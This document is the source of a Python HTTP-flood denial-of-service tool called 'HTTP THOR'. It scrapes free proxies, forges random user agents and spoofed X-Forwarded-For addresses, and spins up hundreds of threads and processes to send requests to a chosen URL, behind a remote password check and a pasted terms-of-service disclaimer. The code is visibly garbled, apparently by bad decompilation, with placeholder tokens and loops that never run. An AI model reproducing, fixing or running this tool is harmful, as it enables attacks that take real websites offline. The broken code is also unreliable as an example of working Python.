# ddos
#!/usr/bin/env python #coding: utf-8 #..:: > HTTP THOR &lt; ::.. Mod By THOR import urllib.request as urllib import os import threading import time import random import sys import string import urllib import multiprocessing import hashlib import getpass import socket import http.client as http    CONST_USERAGENT = [ 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3', 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0', 'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0', 'Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0', 'Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)', 'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)', 'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00', 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14', 'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14', 'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02', 'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00', 'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)', 'HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)', 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+', 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+', 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+', 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5', 'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10', 'Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27']  def MyProcess(): '''MyProcess''' __qualname__ = 'MyProcess'  def __init__(self, url, proxy_list, threads_number): multiprocessing.Process.__init__(self) self.url = url self.proxy_list = proxy_list self.threads_number = threads_number   def run(self): for i in range(self.threads_number): Boomer(self.url, self.proxy_list).start() MyProcess = (NODE,28)(MyProcess, 'MyProcess', multiprocessing.Process)  def Boomer(): '''Boomer''' __qualname__ = 'Boomer'  def __init__(self, target_url, proxy_list): threading.Thread.__init__(self) self.target_url = target_url self.proxy_list = proxy_list self.prob = random.randrange(0, 10, 1)   def randomIp(self): random.seed() result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.' result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) return result   def randomIpList(self): random.seed() res = '' for ip in range(random.randint(2, 8)): res = res + self.randomIp() + ', '  return res[0:len(res) - 2]   def randomUserAgent(self): return random.choice(CONST_USERAGENT)   def run(self): method = 'GET' if random.randrange(0, 10, 1) >= 5: method = 'POST' proxy_selected = random.choice(self.proxy_list).split(':') head = method + ' ' + self.target_url + ' HTTP/1.1\r\n' host_url = self.target_url.replace('http://', '').replace('https://', '').split('/')[0] host = 'Host: ' + host_url + '/ \r\n' accept = 'Accept-Encoding: gzip, deflate\r\n' user_agent = 'User-Agent: ' + self.randomUserAgent() + '\r\n' connection = 'Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n' x_forwarded_for = 'X-Forwarded-For: ' + self.randomIpList() + '\r\n' http_request = head + host + user_agent + accept + x_forwarded_for + connection + '\r\n' while None: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((proxy_selected[0], int(proxy_selected[1]))) s.send(http_request.encode('utf-8')) print('@' + method + ' request make.') try: for i in range(3): s.send(http_request) except: tts = 1  continue proxy = random.choice(self.proxy_list).split(':') continue  continue return None  Boomer = (NODE,28)(Boomer, 'Boomer', threading.Thread)  class Main: __qualname__ = 'Main'  def __init__(self): if os.name in ('nt', 'dos', 'ce'): os.system('cls') os.system('title ..................::HTTP THOR::..................') os.system('color a') color = [ 'a', 'b', 'c', 'd', 'e', 'f'] os.system('color %s' % color[random.randrange(0, len(color), 1)]) else: linux_shell_color = [ '\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', '\x1b[35m', '\x1b[36m', '\x1b[37m', '\x1b[95m', '\x1b[94m', '\x1b[92m', '\x1b[93m', '\x1b[91m', '\x1b[0m'] print(linux_shell_color[random.randrange(0, len(linux_shell_color), 1)]) disclaimer = ' \n' \ ' _ _ ___ _ _____ ' \ ' __| | __| |/ _ \\ ___ __| |___ /_ __\n' \ ' / _` |/ _` | | | / __|/ _` | |_ \\ \\ / /\n' \ ' | (_| | (_| | |_| \\__ \\ (_| |___) \\ V / \n' \ ' \\__,_|\\__,_|\\___/|___/\\__,_|____/ \\_/ \n' \ ' ### Using this program you are responsible of your action.\n' \ ' ### Be carefull and read TOS.\n' \ ' ### Author and copyright are reserverd by THOR.\n' \ '\n' \ ' BY ACCESSING AND USING THE SERVICES IN ANY MANNER, YOU ARE "ACCEPTING" \n' \ ' AND AGREEING TO BE BOUND BY THESE TERMS OF SERVICE TO THE EXCLUSION OF ALL OTHER TERMS. \n' \ ' IF YOU DO NOT UNCONDITIONALLY ACCEPT THESE TERMS IN THEIR ENTIRETY, \n' \ ' YOU SHALL NOT (AND SHALL HAVE NO RIGHT TO) ACCESS OR USE THE SERVICES. \n' \ ' IF THE TERMS OF THIS AGREEMENT ARE CONSIDERED AN OFFER, ACCEPTANCE IS EXPRESSLY LIMITED TO SUCH TERMS. \n' \ ' THESE TERMS SHOULD BE READ IN CONJUNCTION WITH HOOTSUITE\xc3\xa2\xe2\x82\xac\xe2\x84\xa2S PRIVACY POLICY AND COPYRIGHT POLICY.\n' \ '\n' \ ' Wherever used in these Terms of Service, \xc3\xa2\xe2\x82\xac\xc5\x93you\xc3\xa2\xe2\x82\xac\xc2\x9d, \xc3\xa2\xe2\x82\xac\xc5\x93your\xc3\xa2\xe2\x82\xac\xc2\x9d, \xc3\xa2\xe2\x82\xac\xc5\x93Customer\xc3\xa2\xe2\x82\xac\xc2\x9d, or similar terms means ' \ ' the person or legal entity accessing or using the Services. If you are accessing and \n' \ ' using the Services on behalf of a company (such as your employer) or other legal entity, \n' \ ' you represent and warrant that you have the authority to bind that company\n' \ ' or other legal entity to these Terms of Service.\n' \ '\n' \ '\n' \ ' ..................::HTTP THOR::..................' \ ' ' print(disclaimer)   def check_url(self, url): if url[0] + url[1] + url[2] + url[3] == 'www.': url = 'http://' + url elif url[0] + url[1] + url[2] + url[3] == 'http': pass else: url = 'http://' + url return url   def retrieve_proxy(self): sourcecode = urllib.request.urlopen('http://free-proxy-list.net/') half = str(sourcecode.read()) half = half.split('&lt;tbody>') half = half[1].split('&lt;/tbody>') half = half[0].split('&lt;tr>&lt;td>') proxy_list = '' for proxy in half: proxy = proxy.split('&lt;/td>&lt;td>')  try: proxy_list = proxy_list + proxy[0] + ':' + proxy[1] + '\n' continue continue  out_file = open('proxy.txt', 'w') out_file.write(proxy_list) out_file.close()  def setup(self): public_key = 'jjvbag%' secret_key = '&amp;kk17cnH%'  try: with open('password.txt', 'r') as f: password_file = f.readline() password_file = password_file.replace('\n', '')  except: print('# Could not find password.txt.') sys.exit(0)   try: sourcecode = urllib.request.urlopen('https://350adf0c87a0387a8100df99cb6...zhwUjBOa1VLUFdtRDhSR01qenZ1M1hZMWs/pwTHOR.txt') except: print('# Impossible to connect to the server, please try again.') sys.exit(0)  hash1 = str(sourcecode.read().decode('utf-8')) hash2 = hashlib.sha1(password_file.encode('utf-8') + secret_key.encode('utf-8')).hexdigest() + '8a,' + public_key if hash1 != hash2: print("##FATAL ERROR##\n\nYou maybe need to update this program or your password isn't correct.\n\nPm nick: Nhi paltalk.com.") sys.exit(0) print('# Password correct.') target_url = input('# Enter URL to send requests: ') target_url = self.check_url(target_url) while None:  try: s = str(input("# Enter 'y' to download a fresh proxy list or or leave empty to skip: ")) if s == 'y': self.retrieve_proxy() print('# Proxy list successfully downloaded.') break continue print('# Failed to download the proxy list.') continue  continue while None: ipotetical_list = str(input('# Enter the proxy list or leave empty to skip default [proxy.txt]: ')) if ipotetical_list == '': ipotetical_list = 'proxy.txt'  try: in_file = open(ipotetical_list, 'r') proxy_list = [] for i in in_file: proxy_list.append(i.split('/n')[0])  continue print('# Error to read file.') continue  continue while None:  try: pools_number = int(input('# Enter the number of parallel processes or leave empty to skip default [0]: ')) except: pools_number = 0  break continue while None:  try: threads_number = int(input('# Enter the number of thread or leave empty to skip default [800]: ')) except: threads_number = 800  break continue for i in range(threads_number): Boomer(target_url, proxy_list).start() time.sleep(0.003) print('Thread ' + str(i) + ' is going up')  if pools_number > 0: for pool_number in range(pools_number): MyProcess(target_url, proxy_list, threads_number).start()  if __name__ == '__main__': main = Main() main.setup()
